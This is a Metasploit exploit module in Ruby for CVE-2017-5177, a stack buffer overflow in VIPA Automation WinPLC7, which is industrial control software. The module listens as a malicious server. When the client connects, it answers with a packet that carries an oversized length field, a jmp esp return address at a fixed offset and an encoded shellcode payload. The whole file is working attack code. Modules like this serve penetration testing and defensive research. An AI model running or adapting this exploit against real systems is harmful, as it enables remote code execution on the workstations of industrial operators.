require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::TcpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'VIPA Authomation WinPLC7 recv Stack Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack based buffer overflow found in VIPA
				Automation WinPLC7 <= 5.0.45.5921. The overflow is triggered when
				WinPLC7 connects to a remote server and accepts a malicious packet.
				The first 2 bytes of this packet are read in and used as the size
				value for a later recv function.  If a size value of sufficiently
				large size is supplied a stack buffer overflow will occur
			},
			'Author'         => [ 'james fitts' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'ZDI', '17-112' ],
					[ 'CVE', '2017-5177' ],
					[ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-17-054-01' ]
				],
			'Privileged'     => false,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "",
					'StackAdjustment' => -3500
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'Windows 7 EN', 
							{
								# ws7v5.exe
								# jmp esp
								'Ret' => 0x00422354
							} 
					],
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Feb 28 2017'))

		register_options(
			[
				OptPort.new('SRVPORT', [ true, "The port to listen on", 7777])
			], self.class)
	end

	def on_client_data(client)
		p = payload.encoded

		pkt =  "\x13\x88\x00\x00\x00"	# len
		pkt += Rex::Text.pattern_create(5000)

		pkt[848, 4] = [target.ret].pack('V')
		pkt[852, p.length] = p

		client.put(pkt)
		handler
		service.close_client(client)
	end

end